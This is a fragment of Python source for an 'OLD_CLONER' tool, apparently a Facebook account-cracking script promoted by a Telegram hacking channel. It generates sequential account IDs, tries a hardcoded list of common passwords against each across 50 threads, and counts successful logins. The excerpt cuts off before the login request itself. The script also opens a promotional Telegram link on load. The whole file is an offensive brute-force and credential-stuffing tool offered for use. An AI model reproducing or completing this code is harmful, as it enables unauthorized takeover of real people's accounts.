...
class OLD_CLONER:
    ...
    os.system(" xdg-open https://t.me/rs_hacking_official  ")
    def banner(self):
        os.system("clear")
        print("DEVELOPER  : RS SAKIB")
        print("GITHUB     : RSSAKIBYT")
        print("Teligerm : https://t.me/rs_hacking_official ")
    ...
    def oldClone(self,series):
        ...
        with ThreadPoolExecutor(max_workers=50) as Mr_Code:
            ...
            for love in self.gen:
                ids = self.uX + love
                passlist = ["123456", "1234567", "112233","12345678", "123456789", "123123","112233", "@#$_&-+()/","0987654321","1234567890", "password", "@@@###"]
    ...
    def CloneOld(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\x1b[mRS-SAKIB {self.loop}|OLD|OK:{len(self.oks)}|CP:{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
